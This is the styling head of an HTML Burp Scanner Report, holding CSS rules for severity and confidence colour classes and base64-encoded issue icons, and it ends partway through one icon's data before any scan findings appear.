<html><head><title>Burp Scanner Report</title>
<meta http-equiv="Content-Security-Policy" content="default-src 'none';img-src 'self' data:;style-src 'unsafe-inline'" />
<style type="text/css">
body { background: #dedede; font-family: 'Droid sans', Helvetica, Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
#container { width: 930px; padding: 0 15px; margin: 20px auto; background-color: #ffffff; }
table { font-family: Arial, sans-serif; }
a:link, a:visited { color: #ff6633; text-decoration: none; transform: 0.3s; }
a:hover, a:active { color: #e24920; text-decoration: underline; }
h1 { font-size: 1.6em; line-height: 1.4em; font-weight: normal; color: #404042; }
h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
h4 { font-size: 1.0em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: bold; color: #404042;}
.rule { height: 0px; border-top: 1px solid #404042; padding: 0; margin: 20px -15px 0 -15px; }
.title { color: #ffffff; background: #1e517e; margin: 0 -15px 10px -15px; overflow: hidden; }
.title h1 { color: #ffffff; padding: 10px 15px; margin: 0; font-size: 1.8em; }
.title img { float: right; display: inline; padding: 1px; }
.heading { background: #404042; margin: 0 -15px 10px -15px; padding: 0; display: inline-block; overflow: hidden; }
.heading img { float: right; display: inline; margin: 8px 10px 0 10px; padding: 0; }
.code { font-family: 'Courier New', Courier, monospace; }
table.overview_table { border: 2px solid #e6e6e6; margin: 0; padding: 5px;}
table.overview_table td.info { padding: 5px; background: #dedede; text-align: right; border-top: 2px solid #ffffff; border-right: 2px solid #ffffff; }
table.overview_table td.info_end { padding: 5px; background: #dedede; text-align: right; border-top: 2px solid #ffffff; }
table.overview_table td.colour_holder { padding: 0px; border-top: 2px solid #ffffff; border-right: 2px solid #ffffff; }
table.overview_table td.colour_holder_end { padding: 0px; border-top: 2px solid #ffffff; }
table.overview_table td.label { padding: 5px; font-weight: bold; }
table.summary_table td { padding: 5px; background: #dedede; text-align: left; border-top: 2px solid #ffffff; border-right: 2px solid #ffffff; }
table.summary_table td.icon { background: #404042; }
.colour_block { padding: 5px; text-align: right; display: block; font-weight: bold; }
.high_certain { border: 2px solid #f32a4c; color: #ffffff; background: #f32a4c; }
.high_firm { border: 2px solid #f997a7; background: #f997a7; }
.high_tentative { border: 2px solid #fddadf; background: #fddadf; }
.medium_certain { border: 2px solid #ff6633; color: #ffffff; background: #ff6633; }
.medium_firm { border: 2px solid #ffb299; background: #ffb299; }
.medium_tentative { border: 2px solid #ffd9cc; background: #ffd9cc; }
.low_certain { border: 2px solid #0094ff; color: #ffffff; background: #0094ff; }
.low_firm { border: 2px solid #7fc9ff; background: #7fc9ff; }
.low_tentative { border: 2px solid #bfe4ff; background: #bfe4ff; }
.info_certain { border: 2px solid #7e8993; color: #ffffff; background: #7e8993; }
.info_firm { border: 2px solid #b9ced2; background: #b9ced2; }
.info_tentative { border: 2px solid #dae9ef; background: #dae9ef; }
.row_total { border: 1px solid #dedede; background: #fff; }
.grad_mark { padding: 4px; border-left: 1px solid #404042; display: inline-block; }
.bar { margin-top: 3px; }
.TOCH0 { font-size: 1.0em; font-weight: bold; word-wrap: break-word; }
.TOCH1 { font-size: 0.8em; text-indent: -20px; padding-left: 50px; margin: 0; word-wrap: break-word; }
.TOCH2 { font-size: 0.8em; text-indent: -20px; padding-left: 70px; margin: 0; word-wrap: break-word; }
.BODH0 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; padding: 10px 15px; margin: 0 -15px 10px -15px; display: inline-block; color: #ffffff; background-color: #1e517e; width: 100%; word-wrap: break-word; }
.BODH0 a:link, .BODH0 a:visited, .BODH0 a:hover, .BODH0 a:active { color: #ffffff; text-decoration: none; }
.BODH1 { font-size: 1.3em; line-height: 1.2em; font-weight: normal; padding: 13px 15px; margin: 0 -15px 0 -15px; display: inline-block; width: 100%; word-wrap: break-word; }
.BODH1 a:link, .BODH1 a:visited, .BODH1 a:hover, .BODH1 a:active { color: #404042; text-decoration: none; }
.BODH2 { font-size: 1.0em; font-weight: bold; line-height: 2.0em; width: 100%; word-wrap: break-word; }
.PREVNEXT { font-size: 0.7em; font-weight: bold; color: #ffffff; padding: 3px 10px; border-radius: 10px;}
.PREVNEXT:link, .PREVNEXT:visited { color: #ff6633 !important; background: #ffffff !important; border: 1px solid #ff6633 !important; text-decoration: none; }
.PREVNEXT:hover, .PREVNEXT:active { color: #fff !important; background: #e24920 !important; border: 1px solid #e24920 !important; text-decoration: none; }
.TEXT { font-size: 0.8em; padding: 0; margin: 0; word-wrap: break-word; }
TD { font-size: 0.8em; }
.HIGHLIGHT { background-color: #fcf446; }
.rr_div { border: 2px solid #1e517e; width: 916px; word-wrap: break-word; -ms-word-wrap: break-word; margin: 0.8em 0; padding: 5px; font-size: 0.8em; max-height: 300px; overflow-y: auto; }

div.scan_issue_false_positive_rpt{width: 32px; height: 32px; background-image: url(data:image/png;base64,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)}
div.scan_issue_high_certain_rpt{width: 32px; height: 32px; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABLNJREFUeNrEV01sVVUQ/ubc+376Z1sQKBSI1WjVNBW00cQEo3FhSFSqG0z8iybGBd0YF0IIO0uUBTGx0Y2BBHcu3BITIYSFuLAEQ4pEMKiPn6qQUgptX+89Z/zOebUS+t7rfS7stOfde8/PzJw535yZEb1nEAvkBGnOoVxwMHwH/+PU9ymHtFsctqpgC6B9Cqzniqb5lTOcWoLijECOsx2GkUv8hqrC/3leaXkaLkkgxiyIjFGHxOsU6aMO+h6ZbKdOuX/676A2iljNgcc473WKTYyar9i/n+1kPRmmtnCJrOiniXGjVOA1biIn1YVXI9rRvco2quTB7yibAtyG8WYTPGiNG6PgIWQXWpVokSHyG4PIQ6rOn8kdCmhFMFxFnTTWAS76ka23pmCRwEgnbkAnb1Y0lHpqai/bqSjKDRAAUMetaaXxqCjb+F0Lkrzrmc3bE6LI1z40Tk5SuIvjMOvXwKzqhPt9vLKLOkoQjHlTaDoRF4o9xsSI4wKiqABTLpBfQVAmnss5e4zorwtMWAv98xqKu95Fy9GDaP72IPJvvAgtjS99HM7GJl84FsU5vmswnIlS/qTeAnaErrZxSSZXriJ6cjPyu94BWlsgK9tRHNkD07MhHEkG2kiLj9Cxg3saohQ2cvem4nbwY+ldTE9DeroXw8L33ZpZej3PPcoXd5g4d1/AwFzeA88NZ0Z6RI+aKS/uL89xzGTzDO8NkRmm/YMbdrDnFfyfRA8SE2+P88UOI6rbsBwUTK6DHgPPyjLJJwif8UfQp8uggFZuxD5eS7oWy0Vi1nkLtC2bAtA2Mx8JspOlCxULi/sL9GfnGlbBEA1TDVmtuQj99dKifneBfc1Njcq/QQzI5YYUWLsK9rtTmPvoC+jULei165gd+hB6oQTpvKtBN8RlmXr4hQMCfSvzOfhoOJfAXfkLUW8Pr9EU9pcSzMauClfVBtwQB304PtIQCPw5NzGMrl6B9IeTSE+NwaxbVbmiNTsnH/4ZHY/IZP+2VmPtpA9MWWNBiHo2Rbz1qZAbpIePQ9pagZamRoDo1NqOmHr4lOZLPt/MpP/MbDB704FhKrAldCUHvsbs+/sg+VymgMR8019Eh1TMlPEa8zrek9V4PhOKn396QXjIQN9+mTnCppCoNBCP9gRIWe/aIiWmAvskixa5XNXEQyfpzbk40+6duo+tJhdVLc/dmAAIJksf8Hl2qcBkutfAHv0ec58cCt6g0zMo79wPd/pnyN2d9YVLMP1Zm5R3KjHkm0xsfmkelT41s11RYs9xZmtdN2TyoX9chelnsptauLHzECaoYaymJ4St3Uxdcj+j4LjMXwQmLPAJgn8YjDvIExy6XtcNCzkILeHO/QbHW1E2dC0hPIifIOwfv1141cKEQ2coop8vo3UcKKTgsrIDsqJ9AVU1awhg1Dn7CKf8JHeUObV8pkTfGCDXvf891FYKOfr6XmfTAQovVSuxTP2yCrsJml6a7XN+TmQSGqomTLD6+cy59AHedrtRp3CSiU2D/y52FtGcq1zpoqFOdPOmZUndTsbPcWgLx/v53h0S2goRM74cd6c5dpy1/DdOk0lfhkkozz1746v/SkZ8G/0twAAD7yPRry7F6AAAAABJRU5ErkJggg==)}
div.scan_issue_high_firm_rpt{width: 32px; height: 32px; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABEdJREFUeNrEV91vVEUU/83cu11326XdLR+tqNgEwQgCCcXEVI0YjQkvalZMxFf4A/wDpAkhPJZnNLE+a+K3PogRRVJNTCCmATGaCEEQLWW/u93dO3f4zdytW2x7996QuCc5d+bOnfMxc35z5lyhp6fxLwkNNJOAJwHpmQH2Hfa16Y8B+gA7z0DjMbYPkJ22pCL/yemX2H7HuV9S1xX4Row6oINZPgeazfZYQC66kcCTlH+TSg52mTnEeTvZvtY2+AFlT7L9IUxIhlhOQYu3qWyGLwcRlzRlNIzsO+RUXAd2Q8mL8MUR3CtpfZiOXLI6V3XAxH05az3B2F3gt7EQpUGb5sL603ePrU4PM+7nyU/Z8OgOSzQIuiVeTG7jys/xiwg1bkCUHYQqVdCav83oDxJNTrgTvuZui+/hJrZbeSktu1BOB26+/jbYiTBQCmvwxsxPuPD+J/CVh10vHcCW554GypVuO0FH3TNw3M20oe8OAfQptqNdY5pOo/XPLRr/GPVSGV6jifPs165cAzKZKOA0Nk7ZI0mW7cFt9Dwa4PpcNApFu9D+3BBSQ+vsrtQLBfstIh1p26QDdvE4ERnVvoZwXTgJF5p9ww7fJdl8i0QWA+KEmS+J+Cw9yOP/JIsTkYcjc8QAXkGvSDovGwf298wBiP3EgN7ROwf0DnMKRntnX48aBzK92wFkZOeyRuQjpD0PqtWCYCo1rFoefLJNrzH3wGSOMnkgsggNJ9fn7NmvzM2xTcDt60P/hvUsNhpxHSgbl6/HEqnVkRjOYe/reQyOjiDNS2n8jTxSD22mumpcB6673NJZgmFfnEoDxSI27t2NF7eOQSsFMcxcVix3bsroNGtS8em4GLAp19x8949AbHkQqNRYO3pxjZv5p5nQ1WdEklpWYHZPo/exdmDcb537EarZwqY9O801CywsxACi8KjrU5egqrFImIbjHO56lxty6Gcqhcsffo6fP/qCIhqPPv8s9hAHxim7E1F2Uan3OHdB2ntZeUcjGTc0MID6H1fxy1dnkM5lLRB//eYsbl+8zEJlXfTt99UkH7wNjddS/sWh45Fi6CtIFiUJhqFRrWKxUrXHMDHQz9WrqKs/zoXfYOhNPdBeudd6i/3Zrk5Ua0iObMT4oVdZkGStI+OH8sjwRKBU7m7c2AhsWTwJPfVu53hJZxh9yd/4kl0zJMuKUj1fsFnQ3bQhOBU8kmsuIBgvMllt5ernl+ZJ27EsYT80G0/QylyoIuNEoQTBktylIyiVuhvX1Nls7FtufOWPiT3j/u9UtotvM6Fbaai+yKNXD26TcOMzVqfR/Z95clUBgZsUmKDgpMn+93DbtWh0ksCdYP/mak6GZw3tH+PzEa5wiu3fMQybuVOBrNWx9mbqk9MrR1nxBj9HFphB6pXmB1O8wEH+geBxMnMwBtsSBAGumdxOmbNsv+bc+tKxXcI4880KU3cEGADDcbVpFKB7lwAAAABJRU5ErkJggg==)}
div.scan_issue_high_tentative_rpt{width: 32px; height: 32px; background-image: url(data:image/png;base64,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)}
div.scan_issue_info_certain_rpt{width: 32px; height: 32px; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABElJREFUeNrEV81vVFUU/5373nw405npgKVpY9QU4qof0cSgMZEFC+tCGiMxKnFT2ciqgBujCRvdAfUfMGFFYoyJbJRgABlicEEw7TQxoi0tFkpEWjpSmM93/d0704+0nXnvKYH7evvuffPu+Z17zu+dc66MHDkC0zQvh5erYxx5EDFP7b/Gr7pDIIOcvAotfbx3sWcbLyywz/G9vIjk+PJpDdyGogTdWK3NWKGqSqjxkoZsF/6tl0tHRMs7HCebvJNif5rv7STQfo6XKP8r3kfZJ1oJV81+0PV/R9nz7B+0AN+sJblmmIbMU86x/6CA9HDH4xwcxv9tGofosjxH2wMoYPc9QO8Y8D4/2cViCQ+KxbrK0tqN9Pk43TKg6xirCmisXpw+RTk/tzI3SWb7/MJdxOMxJBMJ3JlfgOdp+7xFSxjZQgysUcKNILpGG+cCb3G/nRvAl198AW++8Rocx8GZcxfZc8i2Z/yWxl0duUBLbDdKGHWVi+UrcpzznvUmWt/u3VtCV+c2DL//tgVMp9qwd+h1PLejBwt3F33oYEClx9HuqNYC01XNfvX6WU97B4NwqlytEji94fmTW7MolysBOGmVGOGGn3EQWSHhZ0FJbXb82x/XcPmX8ZVnk9eu48rYBLZkM4FkmCBEunzOTcOlBmkGj/eCKhChz2OxKE6c/Aa/Xp20HLh8ZYwk9BAjIc09iBX4t0+Ud8BEwqE1Mde3edQ2mXgCJZr7+x9+pB89dG7roGVSqNVqgcND3Qoy5NIju+FDvA074OuFwj8kYweUUpZ8sWjUfoZah5Dlqd0usXvDgBuQv+/M4/mBXuzdM0gXuDhzPodzuUvYmm0PESAtGfvoAt0dRoH79x8gS6APh/etBJ5339qD6ZlZzPx5A5l0Koy4bvMVpMOsKJbK1vTro153VydDczFspkipsCuUEpKtujE+kJSGD6HlsRdCJziNh9UKpmaZw2Np1oU3FcNxXh4TPLEnqIBzNmwceDjNlgBnlQd1StvS8VHDgzFUTinxKoaEJ+VRe5+YjtYFZSa0wic6YDowodZ1NxbTkYhrq6KAuzf9U/sZeqJQE5nRokclABciBN+s8FhcLFglguyemF+URaYrxFbLkFW4h2iFKT87JJMJzN36C19/+91K6j1/8ZJNzdlMxjcDEm+qgspBg2hRPdaEdTeIyTS7orr8OwfxVsmonaWYqQGvsjBxHIWp6etoa0vCcZ2m9UBjY6WKVHYBldWT0bLZ61M1y4z+EqPTT80qY8MBhyF3CxPSjZtzdp7JpO0zn2JkieXfKx682Tq4ND0XjHmCft6bBqjlnJ9ieZZm9lMt6gCpS83XRA8Y2bKO7GpzlsoUidnv+RyrAtUcwHFPdD+VmAx1Nmws/kjXT0hf2gNniLLBrOHaXka7w60irRvgszGn2/1U5mNaelDs8RxNj+eEyhH0NE19m1U//M4Z/wowAOHbmDGmtG2lAAAAAElFTkSuQmCC)}
div.scan_issue_info_firm_rpt{width: 32px; height: 32px; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABKFJREFUeNrEV0toXFUY/v5z78x0JjHpJGPbJLVVFFppTdzUKopWobEKFUnpQkHwsXElIiii4ErwgZCFaE1du2hdiIguIqaLFtRN0mgwtEUMtuo0mTzmmWQe5/idM2lDNXNzp0pzwsk99869//M73/8f+WJsDHYYTsUZ18L/As0nWgmMMfB4LyLb+cPjXD3Eh3u5voXTR31ozj/52iRXp43ga2hzQWr2DcrQlCXayS9TfNWjBlP/8IqAhkNB7uZ8hR88Zdz7ptGr7fzpThoxIIJBWvwVPDPIZ6eC5a8xnApaqowM+pAxLp8xIYy9RoDgMDwZ4fUzzmRTBvCD2xXUBCP1skGAz+EMeVqUTDJ1969pwBUFelVRL0M+zuuehoqJC4uNTfEEEq2tFh/uPmBs9ZQ6QyMe++dbyl8BQoTqGe4uiPqety2NdRtn6ObOFJYWS5ibnkZ7RwcikQi01sHBUOobOrfPOS316UevRp1/Ro0YSMIEBN3ukc2pFMZ//AEnj3+CxWIR/UeO4uDAEdRyOSJeB2YlKmpEKrWt9KMk9RQwfE6s9zavu9fLeLylBQuZDE4MHUP60kVUq1V8/ukQJkdHkezsDAEJaY2IssB0EVCoq+/i5c0wcFOej1Kp5DxvbWtzs1IpI59dgOdHQuCSOjz1pCey3wJQMewMvbwVFtilYh7dO3a4sBeyOfwx9Rse6D+EvnvvQ3Z2NpQMG3NP1PvWcxkeHY8xBlk+j4XaWUxeJBpFPJHAL2OjKDLvvVTueZ5bK17DDrLtbb4WOUSWi4X9yG658vIyasz9vgcPIBqLOSwUqNxrQrnUZR0lU+OR6+GYtmQSmctpLBEPqW1dzqBqpWK3WjNEdcDnv7uaIjemIMltOHl2zG3DUqGAR4mHhw8/QSBm1yOka3YE0bfHmtvTjAGb4nEUqdRuvanz55wBJ44fw4WJCRJSZ5NMbVIqiPXWGj4BuDAzg+XFJWzp6kY7977N/Uz6L4Iz0nQqVbO1xjKd5/sOfJZ67b1PGl6PihsaQBAW8H8Mkeuqlyz5uIiNGgZpy4bjG6FbnPv4WXkwwxsWAGNGWAvkO66zN1y5rQMaJ8lbWntiPrrR8Tc18yUqelq5/tiYd01osIuj3Uq5DEXzLfXansCWZBWahmlBzbxmSVNpY3shk2cUXqo3JsHDKrfk40d8ZKYvsyRnnTEdqZtZC6rhtmtND7EUnhdP2BOKrc22J9QfKpjTWMcI2wfe1N6OgedewLae7S4iA88+j129fcjOzYaAvvldV/SLrres0eVTKycj2yQwGvEyvHNSP/U0LEZ2JNmUzmdm2KAU0b3zVhTzOVemg9JAueVlo3dVxEypf58LLCyxKMbcw8VUEAasI/OzGcTZkm/p7kFufu4qJoKaKXq4n+Q9pdk2aFWfa32Rpp+9vH4blEdriO0FrOc2KhJMxT8Zo63Ms64RMauzgckmT/v6mZZXeVP8b2SD93g47WOGfw1/NFv9/AOaeQdj/g5vLjWhd5bOfczI7CbUXg8s7yGEpSnkDRrDzlkOuuO5yF66ttOeUVacyDkDBRP09Ax/H9bQeRWCXP4WYACYVfKTOSe0SAAAAABJRU5ErkJggg==)}
div.scan_issue_info_tentative_rpt{width: 32px; height: 32px; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAB19JREFUeNqMl3moVUUcx2fOOXfRf56VlBEtmEFSaBpmRb5SJNuwCCLIP1IsKiJIEqKiotUIo4I2SrCiIPxHX5uRScuzsn0jw0jJBCNf6TOC7tlm+vxmefe+p/U68LtnZu7Mb/n+tjl67dq1Kj5aa1WWpaqq2s2tVSpJtFu31k4yxlzArnP5azZ0HHRUOPoH9Av0LTQIvcWRPfKHMVo4wcOKBFUUTdaSMFcqU+M+epoxdgUKLGU88V82TQ4kii0Nay9Dj0Jf/Bf38RS4B6vvEgv8k+ziZyO0FWR2gNDvHjl1mLXmeGv1HPaez9Kp/LeEt9DT0Aoo/18KaO1eU2CwnveZMgeyQWuTR/h3QKDzJC7ysIbnY6av+Lk9j/9F6GL23sB7EeuX8/5mrLxk7AJMToSx+PJMqMaH19R12l/XyUCSWCWUZV6oMXUgwzkdlJd4Ue9Bl3IWBdReFqfy/or3ObJvFAKdTqerTZJMqmv1CUyOYLoLBouwfLt2nA0CapWmiVg+DZrPvqnK++cHXu/A/FdcMYIkSryGbtMZvxHQHExTc0pZZttGFOBxUS5WlGW9mTHC9Z6qUrO0Tvb7TZUSxjDsIyAfh66OWdPziCVPam1WVlWTTEpVo5ELYvtIrLPSVH+apmpOlpXvo9rRnK1E90SYBOhuYzxbxkWh56HlfvGxCBfLWScu9HdR+CGeNv6+JUkEQZWKAl6RBGrAM+vHxn0oNLnRKJ/XukS5SiV5XqhOJ59cltWDIhzLr63reqfWhROeptb5F/qA/48dI3QY+mtMGJ+RZYZgFUQzlectJWPCqYN7L3Nxq/QSY9KZUhMCAukd3g1qGxauAaoQaClMUhF+M5OTegJ1N2sw0ygkpJZifcf/p7GsvrjZrBY0m0a1WtbFDe7EuGyQgH5dsgjDVieJcQpIKl7ng0bfRiC6A1mWhBRzdHNPmta45nT2Doj1zIfrWr+Aov1dBTX+r25qtXIl1GhI9iQhgPXKoORCFDlGpEjhmIBVB0DgVSmdPlVq2eT8xMbNMbIRdicpOVTXIynnkLI2/Yz5hlhi4TUbNJXskxjC71CBEvV2+H8rZ4n/KzImoonU7AGBCUUdU6G6rqLdy7GAAFRFWTaeAkYl8DWbZewTbs6+r8U14VAfKSzoVsLLx4GNhW4dazM4Mx8F1EyvdfKRj4dY3VKHQs/zWNfHhHy7FAvcXilGHgl1Zc/+P1C46taYmG3u+cyjZGcRA/b4AOVO0dCXVxMiPx1TJT2HVqsDlFWYO8Z9KLWJyfSebFgfy3bshqJAUOLnsOlYsWGSb7vmwKGS29oRhj7Z27mLDVEOZu26NsvYc3dszaEC4ip7f/escqj18DvwL81Iq4Pn3cZDGXWW4Fv58xKEPweMU3oLoowRvoB6MuwbmSX4tMsCY0aZ5hWTNAo69klv8nGgQ5n1qSPFSIIsNpsg8IVe4SF2dlSVnougD+O6+L7Z1D1ucNQ3ggx+3BUYnOhjoJsFsllKaZ5nriBFKopU0nGzdMbw/IlLHmBtOmn3aRQuPJpNb4RXXMcb1glB7d1kQfINAQVkydnU72dG9xdfhiXtetelVmRZcRXIfEnqSol9EQX2hZ4xYoCvqNa5IcZDKMVzwuyrjEO0UbUCiBdLHRgdB1p5Kw1M0hG